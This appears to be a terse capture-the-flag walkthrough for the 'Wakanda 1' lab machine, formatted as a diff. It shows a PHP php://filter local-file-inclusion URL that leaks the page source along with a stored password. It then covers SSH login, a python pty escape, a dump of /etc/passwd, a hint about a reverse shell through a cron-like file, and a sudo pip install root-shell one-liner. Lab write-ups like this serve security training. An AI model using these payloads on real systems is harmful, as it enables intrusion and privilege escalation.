@@ -1,0 +1,147 @@
+http://x.x.x.x/?lang=php://filter/convert.base64-encode/resource=index (base64 cevirdim cunku rot13 cevirdigimde keysensitive olmuyor sifre dogru vermiyor.)
+
+______________________________________________________________________________________________________________________________________________
+<?php
+###$password ="Niamey4Ever227!!!" ;//I have to remember it
+
+if (isset($_GET['lang']))
+{
+include($_GET['lang'].".php");
+}
+
+?>
+
+
+
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Vibranium market">
+    <meta name="author" content="mamadou">
+
+    <title>Vibranium Market</title>
+
+
+    <link href="bootstrap.css" rel="stylesheet">
+
+    
+    <link href="cover.css" rel="stylesheet">
+  </head>
+
+  <body class="text-center">
+
+    <div class="cover-container d-flex w-100 h-100 p-3 mx-auto flex-column">
+      <header class="masthead mb-auto">
+        <div class="inner">
+          <h3 class="masthead-brand">Vibranium Market</h3>
+          <nav class="nav nav-masthead justify-content-center">
+            <a class="nav-link active" href="#">Home</a>
+            <!-- <a class="nav-link active" href="?lang=fr">Fr/a> -->
+          </nav>
+        </div>
+      </header>
+
+      <main role="main" class="inner cover">
+        <h1 class="cover-heading">Coming soon</h1>
+        <p class="lead">
+          <?php
+            if (isset($_GET['lang']))
+          {
+          echo $message;
+          }
+          else
+          {
+            ?>
+
+            Next opening of the largest vibranium market. The products come directly from the wakanda. stay tuned!
+            <?php
+          }
+?>
+        </p>
+        <p class="lead">
+          <a href="#" class="btn btn-lg btn-secondary">Learn more</a>
+        </p>
+      </main>
+
+      <footer class="mastfoot mt-auto">
+        <div class="inner">
+          <p>Made by<a href="#">@mamadou</a></p>
+        </div>
+      </footer>
+    </div>
+</body></html>
+______________________________________________________________________________________________________________________________________________
+
+ssh mamadou@host -p 3333
+password: Niamey4Ever227!!!
+
+
+mamadous bash is not /bin/bash so we are in python
+
+import pty
+>>> pty.spawn("/bin/bash")
+
+so you gonna get bash with this code.
+
+______________________________________________________________________________________________________________________________________________
+
+mamadou@Wakanda1:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
+Debian-exim:x:104:109::/var/spool/exim4:/bin/false
+messagebus:x:105:110::/var/run/dbus:/bin/false
+statd:x:106:65534::/var/lib/nfs:/bin/false
+avahi-autoipd:x:107:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
+###mamadou:x:1000:1000:Mamadou,,,,Developper:/home/mamadou:/usr/bin/python
+devops:x:1001:1002:,,,:/home/devops:/bin/bash
+______________________________________________________________________________________________________________________________________________
+After than you are going to find antivirus file. that file is similar crontabs... you will be changed this file so you are going to get reverse
+shell. when you are devops, you gonna try to be root.
+______________________________________________________________________________________________________________________________________________
+privilege escalation 
+TF=$(mktemp -d)
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+sudo pip install $TF
+ _    _.--.____.--._
+( )=.-":;:;:;;':;:;:;"-._
+ \\\:;:;:;:;:;;:;::;:;:;:\
+  \\\:;:;:;:;:;;:;:;:;:;:;\
+   \\\:;::;:;:;:;:;::;:;:;:\
+    \\\:;:;:;:;:;;:;::;:;:;:\
+     \\\:;::;:;:;:;:;::;:;:;:\
+      \\\;;:;:_:--:_:_:--:_;:;\
+       \\\_.-"             "-._\
+        \\
+         \\
+          \\
+           \\ Wakanda 1 - by @xMagass
+            \\
+             \\
+
+
+Congratulations You are Root!
+
+821ae63dbe0c573eff8b69d451fb21bc
